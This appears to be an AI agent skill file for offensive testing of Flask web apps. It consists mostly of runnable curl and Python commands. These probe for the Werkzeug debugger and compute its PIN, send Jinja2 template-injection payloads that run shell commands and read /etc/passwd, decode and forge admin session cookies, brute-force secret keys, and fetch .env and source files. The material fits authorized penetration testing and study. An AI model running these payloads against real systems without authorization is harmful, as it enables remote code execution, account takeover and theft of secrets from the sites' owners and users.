---
name: framework-flask
description: "Flask security testing — Werkzeug debug console RCE, secret key brute force, Jinja2 SSTI, session cookie forgery, PIN generation, unsafe redirects. Triggers: 'flask', 'werkzeug', 'flask security', 'jinja2 ssti', 'flask debug', 'python flask', 'flask secret key', 'werkzeug debugger'."
---

# Flask Security Testing

Flask attack surface: Werkzeug debugger RCE, secret key, Jinja2 SSTI, session forgery.

## Phase 1: Fingerprinting

```bash
TARGET="https://TARGET"

# Detect Flask/Werkzeug
curl -sI "$TARGET" | grep -i "werkzeug\|python\|flask"

# Check debug mode (Werkzeug interactive debugger)
curl -s "$TARGET/console" | grep -i "debugger\|werkzeug\|interactive"
curl -s "$TARGET/debugger" -o /workspace/output/debugger.html

# Trigger 500 to check debug mode
curl -s "$TARGET/nonexistent/$(python3 -c "print('A'*500)")" | grep -i "werkzeug debugger\|pin"
```

## Phase 2: Werkzeug Debug Console PIN

```bash
# If debugger exposed — extract PIN from machine info
# Requirements: username, modname, appname, app.py path, MAC addr, machine-id

# Try common paths to reach console
curl -s "$TARGET/__debugger__"
curl -s "$TARGET/console"

# Brute-force PIN (if debug exposed without PIN)
python3 - <<'EOF'
import itertools, hashlib, time

def generate_pin(username, modname, appname, app_root, mac_addr, machine_id):
    rv = None
    num = None
    h = hashlib.sha1()
    for bit in [username, modname, appname, app_root, mac_addr, machine_id]:
        h.update(bit.encode('utf-8', 'replace'))
    h.update(b'cookiesalt')
    rv = h.hexdigest()[:9]
    for group_size in [3, 3, 3]:
        num = int(rv[:group_size], 16)
        rv = rv[group_size:]
        print(str(num).zfill(3), end='-')
    print()

generate_pin('www-data', 'flask.app', 'Flask', '/app/app.py', '0' * 12, '/etc/machine-id')
EOF
```

## Phase 3: Jinja2 SSTI

```bash
# Detect SSTI
for payload in "{{7*7}}" "{{7*'7'}}" "{{'a'*7}}" "{{config}}"; do
  result=$(curl -s "$TARGET/render?template=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")")
  echo "$payload → $(echo $result | head -c 100)"
done

# RCE via SSTI
RCE_PAYLOAD='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
curl -s "$TARGET/render?template=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$RCE_PAYLOAD'))")"

# Mro-based RCE
MRO_PAYLOAD="{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}"
curl -s "$TARGET/render?name=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$MRO_PAYLOAD'))")"
```

## Phase 4: Session Cookie Forgery

```bash
# Decode Flask session cookie
SESSION=$(curl -sc /tmp/cookies.txt "$TARGET/" && grep session /tmp/cookies.txt | awk '{print $7}')
echo "$SESSION" | python3 -c "
import base64, zlib, sys, json
session = sys.stdin.read().strip()
payload = session.split('.')[0]
payload += '=' * (4 - len(payload) % 4)
data = base64.urlsafe_b64decode(payload)
try:
    print(json.dumps(json.loads(zlib.decompress(data[1:])), indent=2))
except:
    print(data)
"

# Forge session with known secret key
python3 -c "
from flask.sessions import SecureCookieSessionInterface
from flask import Flask
app = Flask(__name__)
app.secret_key = 'GUESSED_SECRET'
si = SecureCookieSessionInterface()
s = si.get_signing_serializer(app)
print(s.dumps({'user':'admin','role':'admin'}))
"
```

## Phase 5: Secret Key Discovery

```bash
# Common Flask secret keys
for key in "secret" "dev" "development" "flask-secret" "supersecret" "changeme" "mysecret"; do
  python3 -c "
from itsdangerous import URLSafeTimedSerializer
s = URLSafeTimedSerializer('$key')
try:
    print(s.loads('SESSION_COOKIE_HERE'))
    print('KEY FOUND: $key')
except: pass
" 2>/dev/null
done

# Grep source if accessible
curl -s "$TARGET/static/app.py" | grep -i "secret_key"
curl -s "$TARGET/.env" | grep -i "secret"
```

## Output

Save to `/workspace/output/`:
- `debugger.html` — Werkzeug debug page
- `ssti-test.txt` — SSTI probe results

## Next Phase

→ `vuln-ssti` for advanced Jinja2 SSTI exploitation
→ `vuln-info-disclosure` for secret key exposure paths
